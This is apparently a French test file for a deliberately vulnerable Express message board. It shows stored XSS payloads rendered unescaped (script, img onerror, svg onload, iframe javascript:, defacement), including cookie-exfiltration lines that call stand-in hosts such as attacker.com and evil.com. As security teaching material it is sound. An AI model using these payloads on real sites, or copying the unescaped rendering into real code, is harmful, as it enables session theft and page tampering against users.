/**
 * Tests de démonstration de la vulnérabilité XSS
 *
 * Ces tests vérifient que les payloads XSS sont injectés dans le HTML
 * généré côté serveur sans échappement, démontrant la vulnérabilité intentionnelle.
 *
 * IMPORTANT : La vulnérabilité réelle se produit dans src/lib/app.ts:62
 * lors de la génération du HTML avec ${msg.body} sans échappement.
 */

import assert from 'node:assert/strict';
import test from 'node:test';
import type { Express } from 'express';
import request from 'supertest';
import { createApp } from '../lib/app.js';
import { VulnerableMessageRepository } from '../lib/message-repository.js';

process.env.SQLITE_DB_PATH = ':memory:';

test('Démonstrations XSS via HTML rendu côté serveur', async (t) => {
  let app: Express;
  const repository = new VulnerableMessageRepository();

  t.beforeEach(() => {
    repository.clearMessages();
    app = createApp(repository);
  });

  await t.test('XSS via balise script', async () => {
    /**
     * PAYLOAD XSS : <script>alert('XSS')</script>
     *
     * Ce payload classique injecte directement du JavaScript dans la page.
     * Lorsque le serveur génère le HTML, le script est injecté tel quel
     * et sera exécuté par le navigateur.
     *
     * VULNÉRABILITÉ CIBLÉE : src/lib/app.ts:62
     * Le code utilise une template string sans échappement :
     *   <div class="message-body">${msg.body}</div>
     *
     * RÉSULTAT : Le script est présent dans le HTML et s'exécutera
     */
    const xssPayload = "<script>alert('XSS')</script>";

    // Soumettre le payload via le formulaire
    await request(app)
      .post('/')
      .type('form')
      .send({ body: xssPayload })
      .expect(302) // Redirection après POST
      .expect('Location', '/');

    // Vérifier que le payload est présent dans le HTML sans échappement
    const response = await request(app)
      .get('/')
      .expect(200)
      .expect('Content-Type', /html/);

    // Le payload doit être présent tel quel dans le HTML
    assert(response.text.includes(xssPayload), 'Le payload XSS devrait être présent dans le HTML');
    assert(response.text.includes('<div class="message-body"><script>alert(\'XSS\')</script></div>'),
      'Le payload devrait être injecté sans échappement');
  });

  await t.test('XSS via attribut onerror d\'image', async () => {
    /**
     * PAYLOAD XSS : <img src=x onerror="alert('XSS via image')">
     *
     * Ce payload est plus furtif car il n'utilise pas de balise <script>.
     * L'événement onerror se déclenche lorsque l'image échoue à charger,
     * exécutant le JavaScript malveillant.
     *
     * AVANTAGES POUR L'ATTAQUANT :
     * - Contourne certains filtres basiques qui bloquent <script>
     * - S'exécute même si les scripts inline sont désactivés via CSP lax
     *
     * VULNÉRABILITÉ CIBLÉE : src/lib/app.ts:62
     * Le HTML est généré sans validation ni échappement des balises HTML.
     */
    const xssPayload = '<img src=x onerror="alert(\'XSS via image\')">';

    await request(app)
      .post('/')
      .type('form')
      .send({ body: xssPayload })
      .expect(302);

    const response = await request(app)
      .get('/')
      .expect(200);

    assert(response.text.includes(xssPayload), 'Le payload image XSS devrait être présent');
    assert(response.text.includes('onerror="alert(\'XSS via image\')"'),
      'L\'événement onerror devrait être présent sans échappement');
  });

  await t.test('XSS via balise SVG avec onload', async () => {
    /**
     * PAYLOAD XSS : <svg onload="alert('XSS via SVG')">
     *
     * Les balises SVG supportent les événements JavaScript et sont
     * souvent oubliées par les filtres XSS basiques.
     *
     * L'événement onload se déclenche immédiatement lors du chargement
     * de l'élément SVG dans le DOM.
     *
     * AVANTAGES POUR L'ATTAQUANT :
     * - Contourne les filtres qui se concentrent sur <script> et <img>
     * - onload se déclenche automatiquement sans interaction utilisateur
     * - Compatible avec tous les navigateurs modernes
     *
     * VULNÉRABILITÉ CIBLÉE : src/lib/app.ts:62
     */
    const xssPayload = "<svg onload=\"alert('XSS via SVG')\">";

    await request(app)
      .post('/')
      .type('form')
      .send({ body: xssPayload })
      .expect(302);

    const response = await request(app)
      .get('/')
      .expect(200);

    assert(response.text.includes(xssPayload), 'Le payload SVG XSS devrait être présent');
    assert(response.text.includes('<svg onload="alert(\'XSS via SVG\')">'),
      'La balise SVG avec onload devrait être injectée');
  });

  await t.test('XSS via iframe avec javascript:', async () => {
    /**
     * PAYLOAD XSS : <iframe src="javascript:alert('XSS via iframe')">
     *
     * Le protocole javascript: dans un iframe permet d'exécuter du code
     * JavaScript directement. Cette technique est particulièrement
     * dangereuse car elle contourne de nombreux filtres.
     *
     * VARIANTES :
     * - <iframe src="javascript:void(document.body.innerHTML='Défacé')">
     * - <iframe src="javascript:fetch('https://evil.com?cookie='+document.cookie)">
     *
     * VULNÉRABILITÉ CIBLÉE : src/lib/app.ts:62
     * Le HTML est généré sans sanitization des URL javascript:
     */
    const xssPayload = '<iframe src="javascript:alert(\'XSS via iframe\')">';

    await request(app)
      .post('/')
      .type('form')
      .send({ body: xssPayload })
      .expect(302);

    const response = await request(app)
      .get('/')
      .expect(200);

    assert(response.text.includes(xssPayload), 'Le payload iframe XSS devrait être présent');
    assert(response.text.includes('javascript:alert(\'XSS via iframe\')'),
      'L\'URL javascript: devrait être présente sans filtrage');
  });

  await t.test('XSS avec vol de cookies (simulation)', async () => {
    /**
     * PAYLOAD XSS : Vol de cookies et exfiltration
     *
     * Ce payload démontre une attaque réaliste où l'attaquant
     * tente de voler les cookies de session pour les envoyer à un
     * serveur qu'il contrôle.
     *
     * PAYLOAD RÉEL :
     * <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
     *
     * IMPACT :
     * 1. Le JavaScript s'exécute dans le contexte de la victime
     * 2. document.cookie accède aux cookies (sauf HttpOnly)
     * 3. fetch() envoie les cookies au serveur de l'attaquant
     * 4. L'attaquant peut usurper l'identité de la victime
     *
     * CONTRE-MESURES :
     * - Flag HttpOnly sur les cookies sensibles
     * - Content Security Policy (CSP) strict
     * - Échapper/sanitizer tout contenu utilisateur
     * - Utiliser des fonctions d'échappement HTML
     *
     * VULNÉRABILITÉ CIBLÉE : src/lib/app.ts:62
     */
    const xssPayload = '<img src=x onerror="fetch(\'https://attacker.com?steal=\'+document.cookie)">';

    await request(app)
      .post('/')
      .type('form')
      .send({ body: xssPayload })
      .expect(302);

    const response = await request(app)
      .get('/')
      .expect(200);

    assert(response.text.includes(xssPayload), 'Le payload de vol de cookies devrait être présent');
    assert(response.text.includes('document.cookie'),
      'Le code JavaScript d\'accès aux cookies devrait être présent');
    assert(response.text.includes('https://attacker.com'),
      'L\'URL d\'exfiltration devrait être présente');
  });

  await t.test('XSS avec défacement de page', async () => {
    /**
     * PAYLOAD XSS : Défacement (modification visuelle) de la page
     *
     * Ce payload démontre comment un attaquant peut modifier
     * complètement l'apparence de la page pour tromper les utilisateurs.
     *
     * PAYLOAD RÉEL :
     * <img src=x onerror="document.body.innerHTML='<h1>Site compromis!</h1>'">
     *
     * IMPACT :
     * - Destruction du contenu de la page
     * - Affichage de faux messages (phishing)
     * - Atteinte à la réputation du site
     * - Confusion des utilisateurs
     *
     * SCÉNARIOS D'ATTAQUE :
     * 1. Afficher un faux formulaire de connexion (credential harvesting)
     * 2. Rediriger vers un site malveillant
     * 3. Afficher de fausses alertes de sécurité
     *
     * VULNÉRABILITÉ CIBLÉE : src/lib/app.ts:62
     */
    const xssPayload = '<img src=x onerror="document.body.innerHTML=\'<h1 style=color:red>SITE COMPROMIS</h1>\'">';

    await request(app)
      .post('/')
      .type('form')
      .send({ body: xssPayload })
      .expect(302);

    const response = await request(app)
      .get('/')
      .expect(200);

    assert(response.text.includes(xssPayload), 'Le payload de défacement devrait être présent');
    assert(response.text.includes('document.body.innerHTML'),
      'Le code de modification du DOM devrait être présent');
    assert(response.text.includes('SITE COMPROMIS'),
      'Le message de défacement devrait être présent');
  });

  await t.test('Plusieurs payloads XSS dans différents messages', async () => {
    /**
     * DÉMONSTRATION : XSS persistant multi-vecteurs
     *
     * Dans une application réelle, plusieurs attaquants (ou le même)
     * peuvent injecter différents payloads. Tous s'exécuteront lors
     * du chargement de la page.
     *
     * Ce test vérifie que plusieurs payloads XSS coexistent dans le HTML
     * généré et que l'application ne filtre ni n'échappe aucun d'entre eux.
     */
    const payloads = [
      "<script>console.log('XSS 1')</script>",
      '<img src=x onerror="console.log(\'XSS 2\')">',
      "<svg onload=\"console.log('XSS 3')\">",
    ];

    // Injecter tous les payloads
    for (const payload of payloads) {
      await request(app)
        .post('/')
        .type('form')
        .send({ body: payload })
        .expect(302);
    }

    // Vérifier que tous sont présents dans le HTML
    const response = await request(app)
      .get('/')
      .expect(200);

    payloads.forEach(payload => {
      assert(response.text.includes(payload),
        `Le payload "${payload}" devrait être présent dans le HTML`);
    });

    // Vérifier qu'ils sont tous dans des divs message-body séparés
    const messageBodyMatches = response.text.match(/<div class="message-body">/g);
    assert(messageBodyMatches !== null && messageBodyMatches.length >= payloads.length,
      `Au moins ${payloads.length} messages devraient être affichés`);
  });

  await t.test('Vérification que le HTML contient la structure vulnérable', async () => {
    /**
     * Ce test vérifie la structure du HTML généré pour confirmer
     * que la vulnérabilité est bien présente dans le rendu.
     */
    const testPayload = '<b>Test HTML</b>';

    await request(app)
      .post('/')
      .type('form')
      .send({ body: testPayload })
      .expect(302);

    const response = await request(app)
      .get('/')
      .expect(200);

    // Vérifier que le HTML contient bien le payload non échappé
    assert(response.text.includes('<div class="message-body"><b>Test HTML</b></div>'),
      'Le HTML devrait contenir le payload non échappé');

    // Vérifier que le payload n'est PAS échappé (ce qui serait sécurisé)
    assert(!response.text.includes('&lt;b&gt;Test HTML&lt;/b&gt;'),
      'Le HTML ne devrait PAS contenir le payload échappé (vulnérabilité intentionnelle)');
  });
});